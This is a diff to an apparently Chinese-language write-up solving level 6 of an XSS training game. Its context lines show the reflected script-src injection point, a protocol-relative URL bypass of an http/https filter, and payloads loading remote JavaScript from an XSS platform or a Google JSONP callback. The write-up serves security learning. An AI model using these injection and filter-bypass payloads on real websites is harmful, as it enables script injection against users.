@@ -8,7 +8,7 @@
 
 查看页面源码发现， 无论在 URL 输入什么都会实时回显到 script 标签的 src 属性里面：
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/8d58b8b76c19a282ffbb94d2a514d3b3.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/01.png)
 
 即注入点是这样的： `<script src="注入点" ></script>`
 
@@ -16,7 +16,7 @@
 
 直接 pass。。最后一关简单到离谱。。
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/d8f5c538eabf93e1230782e46e36bcb5.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/02.png)
 
 
 ## 2. 解题方法二（XSS 平台）
@@ -35,13 +35,13 @@ Find a way to make the application request an external file which will cause it 
 
 注册 xss 平台后，任意创建一个项目，然后配置项目源码，勾选最后的“自定义代码”，输入一个 JS 函数 `alert()` ，最后查看项目代码，会给出访问这个项目的 URL，如这里为：[http://xss.tf/IUa](http://xss.tf/IUa)
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/7b691f9f87a49e3c8f1bd816ca67523d.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/03.png)
 
 打开这个 xss 项目的 URL ： [http://xss.tf/IUa](http://xss.tf/IUa)
 
 可以看见页面只打印了一个 JS 函数 `alert()` ，到这里我们构造这个 xss 平台的目的就完成了。
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/267ce122d333df095c3796b78bfedad3.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/04.png)
 
 ------------
 
@@ -55,7 +55,7 @@ Find a way to make the application request an external file which will cause it 
 
 回调原理大概是这样的：
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/6b39195cad1cedac61e5b6aba37cba65.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/05.png)
 
 
 ------------
@@ -66,13 +66,13 @@ Find a way to make the application request an external file which will cause it 
 
 原因是题目对注入点做了正则校验，不允许输入以 http 或 https 开头的内容：
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/345c4bfc4dcd2260fee7136deb35b36c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/06.png)
 
 但是绕过的方式也很简单，直接删掉 `http:` 或 `https:` 即可，最终 payload 变成这样：
 
 `//xss.tf/gAk?callback=alert`
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/91aa862a836bae66c2ca6e9ae5a4680b.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/07.png)
 
 
 在 web 网页中，以双斜杠 `//` 开头的 URL 写法有其特殊用途：
@@ -90,15 +90,23 @@ Find a way to make the application request an external file which will cause it 
 
 打开页面发现，google 会实时根据 `callback=foo` 的值构造一个 `foo` 函数
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/f46760f30906979479d92468dc341f0c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/08.png)
 
 因此可以构造这样的 payload ：`//www.google.com/jsapi?callback=alert`
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/236088dc165a089926adc5b751091208.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/09.png)
 
 这样就可以省去自己搭建 xss 平台的麻烦了，一样可以 pass ：
 
-![](http://exp-blog.com/wp-content/uploads/2019/02/044a7a194f3f13839a9eaea14c17f50c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/10.png)
+
+------------
+
+## 4. 闯关成功
+
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/11.png)
+
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/xss-game/level-6/imgs/12.png)
 
 ------
 
